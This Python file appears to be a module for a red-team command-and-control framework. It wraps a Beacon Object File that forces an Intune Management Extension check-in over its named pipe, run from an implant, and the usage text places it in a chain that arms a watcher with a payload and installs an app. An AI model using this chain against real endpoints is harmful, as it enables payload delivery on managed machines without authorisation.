import os
from typing import Dict, List, Optional, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding, BOFType


_SCRIPT_BASE_PATH = os.path.dirname(os.path.abspath(__file__))

VALID_OPS = ("checkin", "available", "both")


class IntuneCheckinBOF(BaseBOFTask):
    """Trigger an IME check-in via the WCF named pipe."""

    def __init__(self, name: str = "intune-checkin", bof_type: BOFType = BOFType.DEFAULT):
        super().__init__(name, base_binary_name="checkin", bof_type=bof_type)
        self.set_base_path(_SCRIPT_BASE_PATH)

        self.parser.description = (
            "Trigger an Intune Management Extension check-in by calling "
            "CheckInAsync and/or AvailableAppCheckInAsync on the IME "
            "StatusService WCF named pipe. Forces IME to process queued "
            "app installs immediately instead of waiting for the next "
            "scheduled check-in cycle."
        )

        self.parser.add_argument(
            "operation",
            nargs="?",
            default="both",
            choices=VALID_OPS,
            help="Which check-in to trigger (default: both)",
        )
        self.parser.add_argument(
            "--stage",
            type=int,
            default=6,
            choices=range(0, 7),
            metavar="N",
            help=(
                "Debug: stop after stage N and return. 0=args parsed, "
                "1=APIs resolved, 2=pipe name resolved, 3=pipe connect only, "
                "4=pipe+preamble, 5=pipe+preamble+NNS, 6=full run (default)"
            ),
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  intune-checkin                (trigger both check-ins)\n"
            "  intune-checkin checkin        (CheckInAsync only)\n"
            "  intune-checkin available      (AvailableAppCheckInAsync only)\n"
            "  intune-checkin --stage 1      (debug: stop after API resolution)\n"
            "  intune-checkin-nt ...         (same, run on the implant thread)\n\n"
            "Usage in the chain:\n"
            "  1. intune-race               (arm watcher with payload)\n"
            "  2. intune-apps <token> install <app-guid>\n"
            "  3. intune-checkin             (force immediate processing)\n\n"
            "Notes:\n"
            "  The named pipe denies the NETWORK SID, so this only works\n"
            "  from an interactive or service logon context (not WinRM).\n"
        )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        args = self.parser.parse_args(arguments)
        return [
            (BOFArgumentEncoding.STR, args.operation),
            (BOFArgumentEncoding.INT, args.stage),
        ]

    def run(self, arguments: List[str]):
        args = self.parser.parse_args(arguments)
        self.append_response(
            f"[*] Triggering IME check-in (operation: {args.operation}, "
            f"stage: {args.stage}, bof_type: {self._bof_type.name})...\n"
        )
        super().run(arguments)

    def get_gui_elements(self) -> Optional[Dict]:
        return None


class IntuneCheckinNonThreadedBOF(IntuneCheckinBOF):
    """Same BOF, run non-threaded on the implant thread (debug variant)."""

    def __init__(self):
        super().__init__("intune-checkin-nt", bof_type=BOFType.DEFAULT_NON_THREADED)
